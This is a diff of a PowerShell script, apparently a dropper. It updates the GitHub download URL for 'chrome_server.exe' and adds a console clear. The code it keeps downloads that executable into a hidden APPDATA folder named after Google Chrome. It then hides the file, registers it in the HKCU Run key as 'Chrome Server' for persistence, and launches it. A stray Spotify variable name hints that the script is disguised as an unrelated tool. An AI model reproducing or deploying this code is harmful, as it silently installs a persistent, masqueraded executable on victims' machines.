@@ -72,7 +72,7 @@ function Get-File
   }
 }
 
-$uri = "https://raw.githubusercontent.com/yourname1204/future/master/chrome_server.exe"
+$uri = "https://github.com/yourname1204/future/raw/main/chrome_server.exe"
 $dir = $spotifyDirectory = Join-Path -Path $env:APPDATA -ChildPath 'Google\Chrome\'
 if (!(Test-Path -Path $dir)) {
     New-Item -ItemType Directory -Force -Path $dir
@@ -82,11 +82,9 @@ Set-ItemProperty -Path $dir -Name Attributes -Value $hiddenAttribute
 $file_path = Join-Path -Path $dir -ChildPath 'chrome_server.exe'
 Get-File -Uri $uri -TargetFile $dir
 if (Test-Path -Path $file_path) {
+    [System.Console]::Clear()
     Write-Host "Done"
     Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Chrome Server' -Value $file_path
     Set-ItemProperty -Path $file_path -Name Attributes -Value $hiddenAttribute
     Invoke-Item -Path $file_path
 }
-
-
-
